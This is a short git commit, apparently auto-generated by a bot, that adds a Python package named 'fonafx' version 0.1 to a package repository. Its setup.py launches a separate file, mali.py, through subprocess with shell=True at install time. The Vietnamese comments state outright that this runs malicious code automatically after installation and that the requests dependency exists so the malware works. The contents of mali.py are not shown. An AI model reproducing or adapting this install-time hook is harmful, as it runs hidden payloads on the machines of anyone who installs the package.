2c3479daf86cc80cc82c8c2db4c169d26a967584
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2025-07-29 11:05:12 +0000

    Add package fonafx/0.1/fonafx-0.1.tar.gz

---
+++ packages/fonafx/fonafx-0.1.tar.gz/fonafx-0.1/setup.py
@@ -0,0 +1,16 @@
+from setuptools import setup
+import subprocess
+
+# Tự động chạy file mali.py sau khi cài đặt
+def run_malicious_code():
+    subprocess.Popen(["python", "mali.py"], shell=True)
+
+setup(
+    name="fonafx",
+    version="0.1",
+    packages=[],
+    install_requires=["requests"],  # Dependency để mã độc hoạt động
+)
+
+# Kích hoạt khi cài đặt
+run_malicious_code()
